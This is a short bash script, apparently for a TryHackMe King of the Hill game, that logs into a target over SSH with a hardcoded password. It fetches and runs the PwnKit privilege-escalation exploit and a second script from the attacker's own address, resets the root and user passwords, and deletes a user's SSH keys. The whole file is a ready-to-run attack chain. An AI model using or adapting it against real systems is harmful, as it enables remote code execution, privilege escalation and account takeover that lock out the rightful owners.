#!/bin/bash

# Created by @HaruKey :)

# https://github.com/H4ruKey/KOTH

missing() {
  if ! command -v "$1" >/dev/null 2>&1; then
    echo "Install '$1' before running $0 script."
    exit 1
  fi
}

missing sshpass

while getopts ":i:u:p:" opt; do
  case $opt in
    i) IP="$OPTARG" ;;
    u) username="$OPTARG" ;;
    p) new_password="$OPTARG" ;;
  esac
done

if [ -z "$IP" ] || [ -z "$username" ] || [ -z "$new_password" ]; then
  echo "Usage: $0 -i 'The machine IP' -u 'Your username on thm' -p 'The new password'"
  exit 1
fi

vpn=$(ip a show dev tun0 | awk '/inet / {print $2}' | cut -d'/' -f1)

sshpass -p X8JEETQmf3hkS65f ssh -o StrictHostKeychecking=no narrator@"$IP" << EOF
    cd /tmp && wget http://$vpn/PwnKit && chmod +x PwnKit && ./PwnKit
    cd /boot && wget http://$vpn/koth.sh && chmod +x koth.sh && ./koth.sh "$vpn" "$username" 
    echo "$new_password" | passwd --stdin root
    echo "$new_password" | passwd --stdin narrator
    echo "$new_password" | passwd --stdin tdurden
    rm -rf /home/tdurden/.ssh
EOF
